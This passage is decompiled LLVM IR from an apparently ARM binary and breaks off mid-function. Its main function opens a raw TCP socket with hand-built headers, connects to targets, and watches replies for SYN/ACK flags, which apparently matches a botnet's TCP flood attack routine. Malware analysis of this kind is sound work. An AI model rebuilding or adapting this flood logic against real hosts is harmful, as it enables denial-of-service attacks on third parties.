  %v2_c448 = add i32 %v1_c448, 16
  %v3_c448 = inttoptr i32 %v2_c448 to i32*
  store i32 %v0_c43c, i32* %v3_c448, align 4
  br i1 %v2_c444, label %dec_label_pc_c260, label %dec_label_pc_c450

dec_label_pc_c450:                                ; preds = %dec_label_pc_c254, %dec_label_pc_c43c
  %v0_c450 = load i32, i32* @r7, align 4
  %v1_c450 = add i32 %v0_c450, 8
  store i32 %v1_c450, i32* %r0.global-to-local, align 4
  store i32 %v5_be50, i32* @r1, align 4
  %v1_c458 = inttoptr i32 %v1_c450 to i8*
  %v2_c458 = call i32 @function_10d44(i8* %v1_c458)
  store i32 %v2_c458, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c260

dec_label_pc_c460:                                ; preds = %dec_label_pc_bef0
  %v1_c468 = add i32 %v5_be50, 8
  store i32 %v1_c468, i32* %r2.global-to-local, align 4
  %v1_c46c = add i32 %v5_be50, 52
  store i32 %v1_c46c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c1cc.preheader

; uselistorder directives
  uselistorder i32 %v1_c46c, { 1, 0 }
  uselistorder i32 %v1_c468, { 1, 0 }
  uselistorder i32 %v4_c420, { 1, 0 }
  uselistorder i32 %v0_c418, { 0, 2, 1 }
  uselistorder i32 %v0_c3fc, { 0, 2, 1 }
  uselistorder i32 %v2_c39c, { 1, 0 }
  uselistorder i32 %v8_c37c, { 1, 2, 0 }
  uselistorder i32 %v0_c358, { 1, 0, 2 }
  uselistorder i32 %v1_c324, { 1, 2, 0 }
  uselistorder i32 %v1_c320, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_c2c4, { 1, 0, 2 }
  uselistorder i32 %v4_c2c0, { 0, 2, 1 }
  uselistorder i32 %v0_c2a0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_c290, { 0, 2, 1 }
  uselistorder i32 %v4_c274, { 1, 0 }
  uselistorder i32 %v7_c1f8, { 1, 0, 2 }
  uselistorder i32 %v0_c1cc, { 1, 0 }
  uselistorder i1 %v7_c210, { 2, 1, 0 }
  uselistorder i1 %v2_c444, { 2, 3, 1, 0 }
  uselistorder i32 %v1_c18c, { 1, 0, 2 }
  uselistorder i32 %v0_c150, { 1, 0, 2 }
  uselistorder i32 %v3_c004, { 0, 2, 1 }
  uselistorder i32 %v3_bfc4, { 1, 0 }
  uselistorder i32 %tmp87, { 1, 0 }
  uselistorder i32 %v1_bf7c, { 1, 0 }
  uselistorder i32 %v1_bf58, { 1, 0 }
  uselistorder i32 %v1_bf54, { 0, 2, 1 }
  uselistorder i32 %v3_bf38, { 2, 1, 0 }
  uselistorder i32 %v0_bf14, { 1, 0, 2 }
  uselistorder i32 %v1_bf04, { 5, 3, 4, 1, 2, 0 }
  uselistorder i32 %v0_bf00, { 0, 3, 2, 1 }
  uselistorder i32 %v0_befc, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_bee8, { 1, 0 }
  uselistorder i1 %v7_bebc, { 1, 0 }
  uselistorder i32 %v3_beb8, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_bea4, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_be70, { 1, 0, 2 }
  uselistorder i32 %v5_be50, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8 %v5_bdf4, { 1, 0 }
  uselistorder i32 %v4_bd84, { 0, 3, 1, 2 }
  uselistorder i32 %v1_bd68, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 22, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 36, 35, 37, 38, 40, 39, 42, 41, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 6, 7, 4, 5, 9, 8, 10, 13, 11, 12, 14, 16, 15, 17, 18, 23, 19, 20, 21, 22, 26, 24, 25, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29 }
  uselistorder i8 47, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder label %dec_label_pc_c450, { 1, 0 }
  uselistorder label %dec_label_pc_c43c, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %dec_label_pc_c33c, { 1, 0 }
  uselistorder label %dec_label_pc_c260, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c1cc.preheader, { 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb92, { 1, 0 }
  uselistorder label %.thread24, { 2, 1, 0 }
}

define i32 @function_c480(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c480:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp31 = call i8 @__decompiler_undefined_function_1()
  %tmp32 = call i8 @__decompiler_undefined_function_1()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_c480 = load i32, i32* @r4, align 4
  %v1_c484 = urem i32 %arg1, 256
  store i32 %v1_c484, i32* @fp, align 4
  store i32 %v1_c484, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_c49c = urem i32 %arg3, 256
  store i32 %v1_c49c, i32* @r4, align 4
  %v2_c4a0 = call i32* @calloc(i32 %v1_c484, i32 16)
  %v4_c4a0 = ptrtoint i32* %v2_c4a0 to i32
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_c4ac = load i32, i32* @fp, align 4
  store i32 %v0_c4ac, i32* %r0.global-to-local, align 4
  %v2_c4b0 = call i32* @calloc(i32 %v0_c4ac, i32 4)
  %v4_c4b0 = ptrtoint i32* %v2_c4b0 to i32
  %v0_c4b4 = load i32, i32* @r5, align 4
  store i32 %v0_c4b4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c4c4 = load i32, i32* @r4, align 4
  store i32 %v0_c4c4, i32* %r0.global-to-local, align 4
  %v5_c4c8 = inttoptr i32 %v0_c4b4 to i32*
  %v6_c4c8 = call i32 @function_b240(i32 %v0_c4c4, i32* %v5_c4c8, i32 2, i32 0)
  %v1_c4d4 = urem i32 %v6_c4c8, 256
  store i32 %v1_c4d4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c4e0 = load i32, i32* @r5, align 4
  store i32 %v0_c4e0, i32* %r1.global-to-local, align 4
  %v0_c4e4 = load i32, i32* @r4, align 4
  store i32 %v0_c4e4, i32* %r0.global-to-local, align 4
  %v6_c4ec = inttoptr i32 %v0_c4e0 to i32*
  %v7_c4ec = call i32 @function_b240(i32 %v0_c4e4, i32* %v6_c4ec, i32 3, i32 65535)
  %v0_c4f0 = load i32, i32* @r5, align 4
  store i32 %v0_c4f0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_c4ec, i32* @r6, align 4
  %v0_c500 = load i32, i32* @r4, align 4
  store i32 %v0_c500, i32* %r0.global-to-local, align 4
  %v4_c504 = inttoptr i32 %v0_c4f0 to i32*
  %v5_c504 = call i32 @function_b240(i32 %v0_c500, i32* %v4_c504, i32 4, i32 64)
  %v1_c50c = urem i32 %v5_c504, 256
  store i32 %v1_c50c, i32* %ip.global-to-local, align 4
  %v0_c510 = load i32, i32* @r5, align 4
  store i32 %v0_c510, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c51c = load i32, i32* @r4, align 4
  store i32 %v0_c51c, i32* %r0.global-to-local, align 4
  %v6_c524 = inttoptr i32 %v0_c510 to i32*
  %v7_c524 = call i32 @function_b240(i32 %v0_c51c, i32* %v6_c524, i32 5, i32 1)
  %v1_c530 = urem i32 %v7_c524, 256
  store i32 %v1_c530, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_c538 = load i32, i32* @r5, align 4
  store i32 %v0_c538, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_c540 = load i32, i32* @r4, align 4
  store i32 %v0_c540, i32* %r0.global-to-local, align 4
  %v5_c548 = inttoptr i32 %v0_c538 to i32*
  %v6_c548 = call i32 @function_b240(i32 %v0_c540, i32* %v5_c548, i32 7, i32 65535)
  %v0_c54c = load i32, i32* @r5, align 4
  store i32 %v0_c54c, i32* %r1.global-to-local, align 4
  %v3_c550 = mul i32 %v6_c548, 65536
  store i32 %v3_c550, i32* @r7, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c55c = load i32, i32* @r4, align 4
  store i32 %v0_c55c, i32* %r0.global-to-local, align 4
  %v4_c560 = inttoptr i32 %v0_c54c to i32*
  %v5_c560 = call i32 @function_b240(i32 %v0_c55c, i32* %v4_c560, i32 11, i32 0)
  %v1_c568 = urem i32 %v5_c560, 256
  store i32 %v1_c568, i32* %ip.global-to-local, align 4
  %v0_c56c = load i32, i32* @r5, align 4
  store i32 %v0_c56c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c578 = load i32, i32* @r4, align 4
  store i32 %v0_c578, i32* %r0.global-to-local, align 4
  %v5_c580 = inttoptr i32 %v0_c56c to i32*
  %v6_c580 = call i32 @function_b240(i32 %v0_c578, i32* %v5_c580, i32 12, i32 1)
  %v1_c588 = urem i32 %v6_c580, 256
  store i32 %v1_c588, i32* %ip.global-to-local, align 4
  %v0_c58c = load i32, i32* @r5, align 4
  store i32 %v0_c58c, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c598 = load i32, i32* @r4, align 4
  store i32 %v0_c598, i32* %r0.global-to-local, align 4
  %v5_c5a0 = inttoptr i32 %v0_c58c to i32*
  %v6_c5a0 = call i32 @function_b240(i32 %v0_c598, i32* %v5_c5a0, i32 13, i32 1)
  %v1_c5a8 = urem i32 %v6_c5a0, 256
  store i32 %v1_c5a8, i32* %ip.global-to-local, align 4
  %v0_c5ac = load i32, i32* @r5, align 4
  store i32 %v0_c5ac, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c5b8 = load i32, i32* @r4, align 4
  store i32 %v0_c5b8, i32* %r0.global-to-local, align 4
  %v5_c5c0 = inttoptr i32 %v0_c5ac to i32*
  %v6_c5c0 = call i32 @function_b240(i32 %v0_c5b8, i32* %v5_c5c0, i32 14, i32 0)
  %v1_c5c8 = urem i32 %v6_c5c0, 256
  store i32 %v1_c5c8, i32* %ip.global-to-local, align 4
  %v0_c5cc = load i32, i32* @r5, align 4
  store i32 %v0_c5cc, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c5d8 = load i32, i32* @r4, align 4
  store i32 %v0_c5d8, i32* %r0.global-to-local, align 4
  %v5_c5e0 = inttoptr i32 %v0_c5cc to i32*
  %v6_c5e0 = call i32 @function_b240(i32 %v0_c5d8, i32* %v5_c5e0, i32 15, i32 0)
  %v1_c5e8 = urem i32 %v6_c5e0, 256
  store i32 %v1_c5e8, i32* %ip.global-to-local, align 4
  %v0_c5ec = load i32, i32* @r5, align 4
  store i32 %v0_c5ec, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c5f8 = load i32, i32* @r4, align 4
  store i32 %v0_c5f8, i32* %r0.global-to-local, align 4
  %v5_c600 = inttoptr i32 %v0_c5ec to i32*
  %v6_c600 = call i32 @function_b240(i32 %v0_c5f8, i32* %v5_c600, i32 16, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v6_c600, i32* %ip.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_c610 = load i32, i32* @r5, align 4
  store i32 %v0_c610, i32* %r1.global-to-local, align 4
  %v0_c614 = load i32, i32* @r4, align 4
  store i32 %v0_c614, i32* %r0.global-to-local, align 4
  %v1_c618 = urem i32 %v6_c600, 256
  store i32 %v1_c618, i32* @r8, align 4
  %v4_c61c = inttoptr i32 %v0_c610 to i32*
  %v5_c61c = call i32 @function_b240(i32 %v0_c614, i32* %v4_c61c, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c628 = load i32, i32* @r5, align 4
  store i32 %v0_c628, i32* %r1.global-to-local, align 4
  store i32 %v5_c61c, i32* @sb, align 4
  %v0_c630 = load i32, i32* @r4, align 4
  store i32 %v0_c630, i32* %r0.global-to-local, align 4
  %v4_c634 = inttoptr i32 %v0_c628 to i32*
  %v5_c634 = call i32 @function_b240(i32 %v0_c630, i32* %v4_c634, i32 1, i32 1)
  store i32 3, i32* %r1.global-to-local, align 4
  %v1_c640 = urem i32 %v5_c634, 256
  store i32 %v1_c640, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_c650 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_c650, i32* %r0.global-to-local, align 4
  %v0_c654 = load i32, i32* @r7, align 4
  %v3_c654 = udiv i32 %v0_c654, 65536
  store i32 %v3_c654, i32* %r1.global-to-local, align 4
  %v7_c658 = icmp eq i32 %v3_c650, -1
  store i1 %v7_c658, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c658, label %dec_label_pc_c8b4, label %dec_label_pc_c668

dec_label_pc_c668:                                ; preds = %dec_label_pc_c480
  store i32 1, i32* %stack_var_-40, align 4
  %v6_c670 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_c670, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_c684 = call i32 @setsockopt(i32 %v3_c650, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_c684, i32* %r0.global-to-local, align 4
  %v7_c688 = icmp eq i32 %v7_c684, -1
  store i1 %v7_c688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c688, label %dec_label_pc_c8ac, label %dec_label_pc_c690

dec_label_pc_c690:                                ; preds = %dec_label_pc_c668
  %v0_c690 = load i32, i32* @fp, align 4
  %v2_c690 = icmp eq i32 %v0_c690, 0
  store i1 %v2_c690, i1* %cpsr_z.global-to-local, align 1
  %v0_c694 = load i32, i32* @r6, align 4
  %v3_c694 = mul i32 %v0_c694, 65536
  store i32 %v3_c694, i32* %r0.global-to-local, align 4
  %v3_c698 = urem i32 %v0_c694, 65536
  store i32 %v3_c698, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp73 = icmp slt i32 %v0_c690, 1
  br i1 %tmp73, label %.thread19, label %dec_label_pc_c6bc.preheader

.thread19:                                        ; preds = %dec_label_pc_c690
  store i32 0, i32* %stack_var_-40, align 4
  br label %dec_label_pc_cb40

dec_label_pc_c6bc.preheader:                      ; preds = %dec_label_pc_c690
  %v5_c6a0 = load i32, i32* @r7, align 4
  %v8_c6a0 = udiv i32 %v5_c6a0, 16777216
  %tmp74 = udiv i32 %v0_c694, 256
  %v8_c6a4 = urem i32 %tmp74, 256
  store i32 %v8_c6a4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v3_c7a8 = icmp ugt i32 %v0_c654, -65537
  %v2_c7cc = ptrtoint i32* %stack_var_-60 to i32
  %v2_c808 = ptrtoint i32* %stack_var_-76 to i32
  %v2_c80c = ptrtoint i32* %stack_var_-44 to i32
  %v2_c810 = ptrtoint i32* %stack_var_-332 to i32
  %tmp75 = bitcast i32* %stack_var_-76 to %sockaddr*
  %v4_c85c = zext i8 %tmp32 to i32
  %v4_c860 = zext i8 %tmp31 to i32
  %v4_c86c = mul nuw nsw i32 %v4_c860, 256
  %v4_c87c = zext i8 %tmp to i32
  %v1_c880 = and i32 %v4_c87c, 18
  %v2_c884 = icmp eq i32 %v1_c880, 18
  %v1_c7b8 = mul nuw nsw i32 %v3_c654, 256
  %v4_c7bc = and i32 %v1_c7b8, 65280
  %v5_c7bc = or i32 %v8_c6a0, %v4_c7bc
  %v3_c7c095 = udiv i32 %v4_c7bc, 256
  %v1_c7c4 = trunc i32 %v3_c7c095 to i8
  %v1_c988 = mul i32 %v0_c694, 256
  %v4_c990 = and i32 %v1_c988, 65280
  %sext = mul i32 %v6_c4c8, 16777216
  %v4_c9a0 = sdiv i32 %sext, 16777216
  %sext6 = mul i32 %v5_c504, 16777216
  %v4_c9c4 = sdiv i32 %sext6, 16777216
  %v5_c86c = or i32 %v4_c85c, %v4_c86c
  %v1_c88c = and i32 %v4_c87c, 5
  %v2_c88c = icmp eq i32 %v1_c88c, 0
  %v1_c7c8 = trunc i32 %v8_c6a0 to i8
  %v5_c990 = or i32 %v8_c6a4, %v4_c990
  %v1_c9b0 = trunc i32 %v4_c9a0 to i8
  %v1_ca90 = urem i32 %v5_c560, 2
  %tmp96 = sub nsw i32 0, %v1_ca90
  %v4_ca98 = and i32 %tmp96, 32
  %v1_caa8 = urem i32 %v6_c580, 2
  %tmp97 = sub nsw i32 0, %v1_caa8
  %v4_cab0 = and i32 %tmp97, 16
  %v1_cac0 = urem i32 %v6_c5a0, 2
  %tmp98 = sub nsw i32 0, %v1_cac0
  %v4_cac8 = and i32 %tmp98, 8
  %v1_cad8 = urem i32 %v6_c5c0, 2
  %tmp99 = sub nsw i32 0, %v1_cad8
  %v4_cae0 = and i32 %tmp99, 4
  %v1_caf0 = urem i32 %v6_c5e0, 2
  %tmp100 = sub nsw i32 0, %v1_caf0
  %v3_caf8 = and i32 %tmp100, 2
  br label %dec_label_pc_c6bc

dec_label_pc_c6bc:                                ; preds = %dec_label_pc_cb2c, %dec_label_pc_c894, %dec_label_pc_c6bc.preheader
  store i32 %v8_c6a4, i32* %r3.global-to-local, align 4
  %v0_c6c8 = load i32, i32* @sb, align 4
  %v1_c6c8 = add i32 %v0_c6c8, 40
  store i32 %v1_c6c8, i32* @sl, align 4
  br label %dec_label_pc_c6cc

dec_label_pc_c6cc:                                ; preds = %dec_label_pc_c8a0, %dec_label_pc_c6bc
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c6d8 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_c6d8, i32* %r0.global-to-local, align 4
  %v7_c6dc = icmp eq i32 %v3_c6d8, -1
  store i1 %v7_c6dc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c6d8, i32* @r7, align 4
  br i1 %v7_c6dc, label %dec_label_pc_cb2c, label %dec_label_pc_c6e8

dec_label_pc_c6e8:                                ; preds = %dec_label_pc_c6cc
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c6f0 = call i32 (i32, i32, ...) @fcntl(i32 %v3_c6d8, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_c6f8 = or i32 %v2_c6f0, 2048
  store i32 %v1_c6f8, i32* %r2.global-to-local, align 4
  %v0_c6fc = load i32, i32* @r7, align 4
  store i32 %v0_c6fc, i32* %r0.global-to-local, align 4
  %v2_c700 = call i32 (i32, i32, ...) @fcntl(i32 %v0_c6fc, i32 4)
  store i32 %v2_c700, i32* %r0.global-to-local, align 4
  %v3_c704 = load i32, i32* %stack_var_-40, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_c714 = mul i32 %v3_c704, 24
  store i32 %v5_c714, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  %v2_c724 = add i32 %v5_c714, %arg2
  store i32 %v2_c724, i32* %r2.global-to-local, align 4
  %v1_c728 = add i32 %v2_c724, 20
  %v2_c728 = inttoptr i32 %v1_c728 to i8*
  %v3_c728 = load i8, i8* %v2_c728, align 1
  %v4_c728 = zext i8 %v3_c728 to i32
  store i32 %v4_c728, i32* %r3.global-to-local, align 4
  %v2_c72c = icmp ugt i8 %v3_c728, 30
  %v7_c72c = icmp eq i8 %v3_c728, 31
  store i1 %v7_c72c, i1* %cpsr_z.global-to-local, align 1
  %v2_c730 = xor i1 %v7_c72c, true
  %v3_c730 = and i1 %v2_c72c, %v2_c730
  %v5_c730 = add i32 %v2_c724, 16
  %v6_c730 = inttoptr i32 %v5_c730 to i32*
  %v7_c730 = load i32, i32* %v6_c730, align 4
  br i1 %v3_c730, label %dec_label_pc_c79c, label %dec_label_pc_c73c

dec_label_pc_c73c:                                ; preds = %dec_label_pc_c6e8
  store i32 %v7_c730, i32* %r4.global-to-local, align 4
  %v0_c740 = call i32 @function_10b68()
  store i32 %v0_c740, i32* %r0.global-to-local, align 4
  %v3_c744 = load i32, i32* %stack_var_-40, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v5_c750 = mul i32 %v3_c744, 24
  %v2_c758 = add i32 %v5_c750, %arg2
  store i32 %v2_c758, i32* %r1.global-to-local, align 4
  %v1_c75c = and i32 %v7_c730, 65280
  store i32 %v1_c75c, i32* %r3.global-to-local, align 4
  %v1_c754 = udiv i32 %v7_c730, 256
  %v3_c760 = and i32 %v1_c754, 65280
  store i32 %v3_c760, i32* %r2.global-to-local, align 4
  %v3_c764 = mul i32 %v7_c730, 16777216
  store i32 %v3_c764, i32* %ip.global-to-local, align 4
  %v1_c768 = add i32 %v2_c758, 20
  %v2_c768 = inttoptr i32 %v1_c768 to i8*
  %v3_c768 = load i8, i8* %v2_c768, align 1
  %v4_c768 = zext i8 %v3_c768 to i32
  store i32 %v4_c768, i32* %lr.global-to-local, align 4
  %v4_c76c = mul nuw nsw i32 %v1_c75c, 256
  %v5_c76c = or i32 %v4_c76c, %v3_c764
  store i32 %v5_c76c, i32* %ip.global-to-local, align 4
  %v2_c774 = call i32 @llvm.bswap.i32(i32 %v7_c730)
  %v7_c778 = lshr i32 %v0_c740, %v4_c768
  %v8_c778 = add i32 %v7_c778, %v2_c774
  store i32 %v8_c778, i32* %r2.global-to-local, align 4
  %v3_c784 = mul i32 %v8_c778, 16777216
  %v1_c788 = and i32 %v8_c778, 65280
  store i32 %v1_c788, i32* %r0.global-to-local, align 4
  %v4_c78c = mul nuw nsw i32 %v1_c788, 256
  %v5_c78c = or i32 %v4_c78c, %v3_c784
  store i32 %v5_c78c, i32* %r1.global-to-local, align 4
  %v2_c794 = call i32 @llvm.bswap.i32(i32 %v8_c778)
  br label %dec_label_pc_c79c

dec_label_pc_c79c:                                ; preds = %dec_label_pc_c6e8, %dec_label_pc_c73c
  %storemerge26 = phi i32 [ %v2_c794, %dec_label_pc_c73c ], [ %v7_c730, %dec_label_pc_c6e8 ]
  store i32 %v3_c654, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_c7a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c7a8, label %dec_label_pc_c8bc, label %dec_label_pc_c7b0

dec_label_pc_c7b0:                                ; preds = %dec_label_pc_c79c
  store i32 %v8_c6a0, i32* %ip.global-to-local, align 4
  store i32 %v5_c7bc, i32* %r3.global-to-local, align 4
  store i32 %v3_c7c095, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c7cc

dec_label_pc_c7cc:                                ; preds = %dec_label_pc_c8bc, %dec_label_pc_c7b0
  %stack_var_-57.0 = phi i8 [ %v1_c8c4, %dec_label_pc_c8bc ], [ %v1_c7c4, %dec_label_pc_c7b0 ]
  %storemerge = phi i8 [ %v1_c8bc, %dec_label_pc_c8bc ], [ %v1_c7c8, %dec_label_pc_c7b0 ]
  store i32 %v2_c7cc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_c7d4 = load i32, i32* @r7, align 4
  store i32 %v0_c7d4, i32* %r0.global-to-local, align 4
  %v3_c7d8 = call i32 @_connect(i32 %v0_c7d4, i32 %v2_c7cc, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_c7e0 = call i32 @time(i32* null)
  store i32 %v2_c7e0, i32* %r0.global-to-local, align 4
  store i32 %v2_c7e0, i32* %r4.global-to-local, align 4
  %v9_c840 = icmp eq i32 %tmp33, %storemerge26
  %v4_c864 = zext i8 %storemerge to i32
  %v4_c868 = zext i8 %stack_var_-57.0 to i32
  %. = zext i1 %v9_c840 to i32
  %v9_c854 = icmp eq i1 %v9_c840, false
  %v4_c870 = mul nuw nsw i32 %v4_c868, 256
  %v5_c870 = or i32 %v4_c870, %v4_c864
  %v9_c874 = icmp eq i32 %v5_c870, %v5_c86c
  br label %dec_label_pc_c7fc

dec_label_pc_c7ec:                                ; preds = %.thread24, %dec_label_pc_c85c, %dec_label_pc_c88c, %bb77
  %v2_c7ec = call i32 @time(i32* null)
  %v0_c7f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_c7f0 = sub i32 %v2_c7ec, %v0_c7f0
  store i32 %v2_c7f0, i32* %r0.global-to-local, align 4
  %v7_c7f4 = icmp eq i32 %v2_c7f0, 10
  store i1 %v7_c7f4, i1* %cpsr_z.global-to-local, align 1
  %v8_c7f8 = icmp sgt i32 %v2_c7f0, 10
  br i1 %v8_c7f8, label %dec_label_pc_c8a0, label %dec_label_pc_c7fc

dec_label_pc_c7fc:                                ; preds = %dec_label_pc_c7ec, %dec_label_pc_c7cc
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-44, align 4
  store i32 %v2_c808, i32* %lr.global-to-local, align 4
  store i32 %v2_c80c, i32* %ip.global-to-local, align 4
  store i32 %v2_c810, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_c650, i32* %r0.global-to-local, align 4
  %v10_c824 = call i32 @recvfrom(i32 %v3_c650, i32* nonnull %stack_var_-332, i32 256, i32 16384, %sockaddr* %tmp75, i32* nonnull %stack_var_-44)
  store i32 %v10_c824, i32* %r2.global-to-local, align 4
  %v7_c82c = icmp eq i32 %v10_c824, -1
  store i1 %v7_c82c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_c82c, label %dec_label_pc_c8b4, label %dec_label_pc_c838

dec_label_pc_c838:                                ; preds = %dec_label_pc_c7fc
  store i32 %storemerge26, i32* %lr.global-to-local, align 4
  store i32 %tmp33, i32* %r3.global-to-local, align 4
  store i32 %., i32* %r1.global-to-local, align 4
  %v7_c84c = icmp eq i32 %v10_c824, 40
  store i1 %v7_c84c, i1* %cpsr_z.global-to-local, align 1
  %tmp101 = icmp ult i32 %v10_c824, 41
  br i1 %tmp101, label %.thread24, label %bb77

.thread24:                                        ; preds = %dec_label_pc_c838
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_c7ec

bb77:                                             ; preds = %dec_label_pc_c838
  store i1 %v9_c854, i1* %cpsr_z.global-to-local, align 1
